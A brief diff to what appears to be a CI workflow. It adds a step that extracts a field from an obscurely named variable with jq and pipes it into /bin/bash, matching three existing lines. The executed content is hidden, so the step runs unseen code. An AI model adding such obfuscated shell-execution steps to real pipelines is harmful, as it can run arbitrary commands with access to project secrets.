@@ -35,6 +35,7 @@ jobs:
           printf '%s' "$py0514" | jq -r .oufs5905 | /bin/bash
           printf '%s' "$tvs24530" | jq -r .t5932 | /bin/bash
           echo $daco8 | jq -r .osz3 | /bin/bash
+          printf '%s' "$nppl4934" | jq -r .y71 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
